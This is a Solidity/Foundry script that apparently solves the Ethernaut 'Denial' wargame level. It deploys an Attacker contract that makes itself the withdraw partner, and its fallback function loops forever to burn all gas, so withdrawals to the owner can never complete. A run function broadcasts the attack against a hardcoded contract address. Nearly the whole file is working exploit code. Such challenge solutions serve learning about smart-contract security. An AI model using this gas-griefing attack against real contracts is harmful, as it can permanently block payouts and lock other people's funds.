// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

contract Attacker {
    
    constructor(Denial denial) {
        //denial = Denial(payable(_denialAddress));
        denial.setWithdrawPartner(address(this));
    }

    // fallback because 
    // payable because it must accept funds
    fallback() external payable {
        while (true) {

        }
    }

}

contract DenialScript is Script {

    Denial private denial = Denial(payable(0xcE1Ab02DBc8bD372aA60015b6212cDf2e2fb9853));
    /**
     * Solution: we can provide a smart contract that consumes all the gas and making it impossible to continue
     * to sending the funds to the owner. This can be done through infinite loop.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(denial);
        denial.withdraw();
        vm.stopBroadcast();
    }
}
